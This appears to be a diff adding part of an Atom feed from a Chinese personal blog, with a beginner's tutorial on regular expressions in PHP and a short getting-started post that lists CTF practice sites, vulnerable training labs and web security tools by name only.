+        <category term="web" scheme="http://m3k0mi.github.io/categories/web/" />
+        <category term="无参数rce" scheme="http://m3k0mi.github.io/categories/web/%E6%97%A0%E5%8F%82%E6%95%B0rce/" />
+        <category term="web" scheme="http://m3k0mi.github.io/tags/web/" />
+        <updated>2024-05-09T09:57:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/04/16/%E5%88%9D%E8%AF%86%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
+        <title>初识正则表达式</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/04/16/%E5%88%9D%E8%AF%86%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
+        <content type="html">&lt;p&gt;正则表达式 (Regular Expression) 是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为 &amp;quot;元字符&amp;quot;），可以用来描述和匹配字符串的特定模式。&lt;/p&gt;
+&lt;p&gt;其实正则表达式就是用来匹配文本的，可以匹配一个或多个字符，灵活地运用正则表达式，就可以完成一些复杂的操作，比如：&lt;/p&gt;
+&lt;p&gt;​		Email 地址：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;​		域名：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[a-zA-Z0-9][-a-zA-Z0-9]&amp;#123;0,62&amp;#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&amp;#123;0,62&amp;#125;)+/.?
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接下来就对正则表达式进行拆分学习&lt;/p&gt;
+&lt;h3 id=&#34;php中常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php中常用函数&#34;&gt;#&lt;/a&gt; php 中常用函数&lt;/h3&gt;
+&lt;p&gt;在 php 当中，用到正则的函数有：preg_match、preg_replace、preg_match_all 等&lt;/p&gt;
+&lt;p&gt;就拿 preg_match 来说，一般用法为&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$pattern&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$subject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;pattern&lt;/p&gt;
+&lt;p&gt;​	要搜索的模式，字符串类型。&lt;/p&gt;
+&lt;p&gt;subject&lt;/p&gt;
+&lt;p&gt;​	输入字符串。&lt;/p&gt;
+&lt;p&gt;所以&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/abc/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;匹配的就是包含 &#39;abc&#39; 的字符串，比如 &#39;abc&#39;、&#39;abcd&#39; 等&lt;/p&gt;
+&lt;p&gt;从上述例子也可以看出，正则一般使用时会加上 //&lt;/p&gt;
+&lt;h3 id=&#34;元字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元字符&#34;&gt;#&lt;/a&gt; 元字符&lt;/h3&gt;
+&lt;p&gt;如果只有普通的字符来匹配正则，肯定是没法满足的，所以就有了很多特异功能的字符&lt;/p&gt;
+&lt;h4 id=&#34;&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; .&lt;/h4&gt;
+&lt;p&gt;. 匹配任意单个字符，但是不匹配换行符&lt;/p&gt;
+&lt;p&gt;.a 匹配 aa、ba、ca、1a 等&lt;/p&gt;
+&lt;h4 id=&#34;字符集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字符集&#34;&gt;#&lt;/a&gt; 字符集 [ ]&lt;/h4&gt;
+&lt;p&gt;[ ] 用来指定一个字符集，只要匹配到了字符集里的任意一个字符就可以&lt;/p&gt;
+&lt;p&gt;[Tt] he 匹配 The、the&lt;/p&gt;
+&lt;h4 id=&#34;否定字符集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#否定字符集&#34;&gt;#&lt;/a&gt; 否定字符集&lt;/h4&gt;
+&lt;p&gt;在字符集当中 ^ 表示否定&lt;/p&gt;
+&lt;p&gt;[^t] he 匹配 ahe、bhe、1he 等等，但是不匹配 the&lt;/p&gt;
+&lt;h4 id=&#34;-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-2&#34;&gt;#&lt;/a&gt; *&lt;/h4&gt;
+&lt;p&gt;* 匹配在该符号之前出现的次数大于等于 0 次&lt;/p&gt;
+&lt;p&gt;c*ar 匹配 ar、car、ccar、cccar 等&lt;/p&gt;
+&lt;h4 id=&#34;-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-3&#34;&gt;#&lt;/a&gt; +&lt;/h4&gt;
+&lt;p&gt;+ 与上个字符类似，匹配该字符之前出现的次数 &amp;gt;=1 次&lt;/p&gt;
+&lt;p&gt;c+at 匹配 cat、ccat 但不匹配 at&lt;/p&gt;
+&lt;h4 id=&#34;-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-4&#34;&gt;#&lt;/a&gt; ?&lt;/h4&gt;
+&lt;p&gt;标记在符号前面的字符为可选，即出现 0 或 1 次&lt;/p&gt;
+&lt;p&gt;例如 [T]?he 匹配字符串 he 和 The&lt;/p&gt;
+&lt;h4 id=&#34;-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-5&#34;&gt;#&lt;/a&gt; {}&lt;/h4&gt;
+&lt;p&gt;是一个量词，常用来限定一个或一组字符可以重复出现的次数。&lt;/p&gt;
+&lt;p&gt;例如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[0-9]&amp;#123;2,3&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;匹配最少两位最多三位的 0~9 的数字 如：999 10 等&lt;/p&gt;
+&lt;h4 id=&#34;特征标群&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特征标群&#34;&gt;#&lt;/a&gt; 特征标群 (...)&lt;/h4&gt;
+&lt;p&gt;(...) 中包含的内容会被看成一个整体，和数学中的小括号 () 作用相同&lt;/p&gt;
+&lt;p&gt;例如 (th) e 匹配 the，不匹配 te、he，注意跟字符集 [ ] 区分开来&lt;/p&gt;
+&lt;h4 id=&#34;或运算符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#或运算符&#34;&gt;#&lt;/a&gt; 或运算符 |&lt;/h4&gt;
+&lt;p&gt;用作判断条件&lt;/p&gt;
+&lt;p&gt;例如 (T|t) he 匹配 the The&lt;/p&gt;
+&lt;h4 id=&#34;转码特殊字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#转码特殊字符&#34;&gt;#&lt;/a&gt; 转码特殊字符 \&lt;/h4&gt;
+&lt;p&gt;反斜杠 \ 在表达式中用于转码紧跟其后的字符，用于指定 {} [] / \ + * . $ ^ | ? 这些特殊字符&lt;/p&gt;
+&lt;p&gt;作用就是跟上边的元字符区分开来，例如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;\[
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;表示匹配 [字符，跟字符集区分开来&lt;/p&gt;
+&lt;h4 id=&#34;和&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#和&#34;&gt;#&lt;/a&gt; ^ 和 $&lt;/h4&gt;
+&lt;p&gt;^ 匹配字符串输入的开始，$ 则匹配字符串输入的结束&lt;/p&gt;
+&lt;p&gt;首先 (t|h) e 匹配 te、he、ahe 等，但是 ^(t|h) e，匹配的字符串必须以 te 或 he 开头&lt;/p&gt;
+&lt;p&gt;$ 和 ^ 同理&lt;/p&gt;
+&lt;h3 id=&#34;简写字符集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简写字符集&#34;&gt;#&lt;/a&gt; 简写字符集&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;简写字符集&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;.&lt;/td&gt;
+&lt;td&gt;除换行符外所有字符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\w&lt;/td&gt;
+&lt;td&gt;匹配所有字母数字&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\W&lt;/td&gt;
+&lt;td&gt;匹配所有非字母数字，即符号 等同于 [^ \ w]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\d&lt;/td&gt;
+&lt;td&gt;匹配数字&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\D&lt;/td&gt;
+&lt;td&gt;匹配非数字&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\s&lt;/td&gt;
+&lt;td&gt;匹配所有空格字符，等同于 [\t\n\f\r\p {Z}]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\S&lt;/td&gt;
+&lt;td&gt;匹配所有非空格字符 [^ \ s]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\f&lt;/td&gt;
+&lt;td&gt;匹配一个换页符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\n&lt;/td&gt;
+&lt;td&gt;匹配一个换行符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\r&lt;/td&gt;
+&lt;td&gt;匹配一个回车符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\t&lt;/td&gt;
+&lt;td&gt;匹配一个制表符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\v&lt;/td&gt;
+&lt;td&gt;匹配一个垂直制表符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;\p&lt;/td&gt;
+&lt;td&gt;匹配 CR/LF (等同于 \r\n)，用来匹配 DOS 终止符&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;简写字符集主要是提供便利，比如我想匹配所有数字，只需要 \d 就可以了，而不用 [0-9]&lt;/p&gt;
+&lt;h3 id=&#34;标记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#标记&#34;&gt;#&lt;/a&gt; 标记&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;标记&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;i&lt;/td&gt;
+&lt;td&gt;不区分大小写：将匹配设置为不区分大小写。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;g&lt;/td&gt;
+&lt;td&gt;全局搜索：搜索整个输入字符串中的所有匹配。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;m&lt;/td&gt;
+&lt;td&gt;多行匹配：会匹配输入字符串每一行。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;比如我想匹配 cat 这个字符串，但是也想匹配 Cat，CAt，cAt 等等，一个一个写就会非常麻烦，只要用到标记 i，/cat/i 就可以不区分大小写匹配 cat 了&lt;/p&gt;
+&lt;p&gt;正则在匹配到第一个就会结束，但是标记 g 可以让他继续匹配，从整个字符串找到匹配项&lt;/p&gt;
+&lt;h3 id=&#34;断言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#断言&#34;&gt;#&lt;/a&gt; 断言&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;断言&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;?=&lt;/td&gt;
+&lt;td&gt;正向先行断言&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;?!&lt;/td&gt;
+&lt;td&gt;负向先行断言&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;?&amp;lt;=&lt;/td&gt;
+&lt;td&gt;正向后行断言&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;?&amp;lt;!&lt;/td&gt;
+&lt;td&gt;负向后行断言&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-6&#34;&gt;#&lt;/a&gt; ?=&lt;/h4&gt;
+&lt;p&gt;正向先行断言表示后面必须跟着？= 定义的表达式&lt;/p&gt;
+&lt;p&gt;例如：(T|t) he (?=\sfat)&lt;/p&gt;
+&lt;p&gt;这个正则由 3 个部分组成，(T|t) 表示 T 或 t 中的一个，he 字符串，(?=\sfat) 正向先行断言，\s 匹配所有空格符，表示后面必须跟着 空格 fat&lt;/p&gt;
+&lt;p&gt;那么这段正则就匹配 the fat 或 The fat&lt;/p&gt;
+&lt;h4 id=&#34;-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-7&#34;&gt;#&lt;/a&gt; ?!&lt;/h4&gt;
+&lt;p&gt;负向先行断言就跟正向先行断言相反，表示后面不能跟着？！定义的表达式&lt;/p&gt;
+&lt;h4 id=&#34;-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-8&#34;&gt;#&lt;/a&gt; ?&amp;lt;=&lt;/h4&gt;
+&lt;p&gt;正向后行断言表示前面必须跟着？= 定义的表达式&lt;/p&gt;
+&lt;p&gt;(?&amp;lt;=(T|t) he\s)(fat|mat) 匹配 the 或 The 后面的 fat、mat&lt;/p&gt;
+&lt;h4 id=&#34;-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-9&#34;&gt;#&lt;/a&gt; ?&amp;lt;!&lt;/h4&gt;
+&lt;p&gt;负向后行断言与正向先行断言相反，表示前面不能跟着？&amp;lt;! 定义的表达式&lt;/p&gt;
+&lt;h3 id=&#34;应用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用&#34;&gt;#&lt;/a&gt; 应用&lt;/h3&gt;
+&lt;p&gt;看到这里，已经全部学会了，那么再回过头来看看前面举到的电子邮箱吧 (注意：正则可以有多种写法，不唯一)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;首先就是 ^ 和 $，表示开头和结尾&lt;/p&gt;
+&lt;p&gt;然后这段正则可以分为四段&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[a-zA-Z0-9_-]+ 	@	[a-zA-Z0-9_-]+	(\.[a-zA-Z0-9_-]+)+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;第一段表示多个字母或数字或下划线&lt;/p&gt;
+&lt;p&gt;第二段就是字符 @&lt;/p&gt;
+&lt;p&gt;第三段和第二段一样&lt;/p&gt;
+&lt;p&gt;第四段表示。后面跟多个字母或数字或下划线&lt;/p&gt;
+&lt;p&gt;组合起来如：123@123.com ，就是电子邮箱的格式&lt;/p&gt;
+</content>
+        <category term="正则表达式" scheme="http://m3k0mi.github.io/categories/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" />
+        <category term="正则表达式" scheme="http://m3k0mi.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" />
+        <updated>2024-04-16T06:34:12.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://m3k0mi.github.io/2024/04/15/web%E5%85%A5%E9%97%A8/</id>
+        <title>web入门</title>
+        <link rel="alternate" href="http://m3k0mi.github.io/2024/04/15/web%E5%85%A5%E9%97%A8/"/>
+        <content type="html">&lt;h3 id=&#34;入门指南&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#入门指南&#34;&gt;#&lt;/a&gt; 入门指南&lt;/h3&gt;
+&lt;h4 id=&#34;一些在线做题网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一些在线做题网站&#34;&gt;#&lt;/a&gt; 一些在线做题网站：&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://ctf.show/challenges&#34;&gt;https://ctf.show/challenges&lt;/a&gt;	(ctfshow)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adworld.xctf.org.cn&#34;&gt;https://adworld.xctf.org.cn&lt;/a&gt;      (攻防世界)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://ctf.bugku.com/&#34;&gt;https://ctf.bugku.com/&lt;/a&gt;      (bugku)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.ctfhub.com/&#34;&gt;https://www.ctfhub.com/&lt;/a&gt;      (CTFhub)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.nssctf.cn/&#34;&gt;https://www.nssctf.cn/&lt;/a&gt;      (nssctf)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://buuoj.cn/&#34;&gt;https://buuoj.cn/&lt;/a&gt;      (buuctf)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#靶场&#34;&gt;#&lt;/a&gt; 靶场：&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/digininja/DVWA&#34;&gt;https://github.com/digininja/DVWA&lt;/a&gt;	(dvwa)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/zhuifengshaonianhanlu/pikachu&#34;&gt;https://github.com/zhuifengshaonianhanlu/pikachu&lt;/a&gt;      (pikachu)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/Audi-1/sqli-labs&#34;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;      (sqli-labs sql 注入靶场)&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/c0ny1/upload-labs&#34;&gt;https://github.com/c0ny1/upload-labs&lt;/a&gt;      (upload-labs 文件上传靶场)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;搭建方法可网上搜索&lt;/p&gt;
+&lt;h4 id=&#34;工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具：&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;burpsuite (抓包软件)&lt;/li&gt;
+&lt;li&gt;firefox 浏览器&lt;/li&gt;
+&lt;li&gt;antsword 蚁剑&lt;/li&gt;
+&lt;li&gt;kali 虚拟机&lt;/li&gt;
+&lt;li&gt;dirsearch (扫描网站后台工具)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;#该文章测试用&lt;/p&gt;
+</content>
+        <category term="web" scheme="http://m3k0mi.github.io/categories/web/" />
+        <category term="入门" scheme="http://m3k0mi.github.io/categories/web/%E5%85%A5%E9%97%A8/" />
+        <category term="web" scheme="http://m3k0mi.github.io/tags/web/" />
+        <updated>2024-04-15T12:09:10.000Z</updated>
+    </entry>
+</feed>
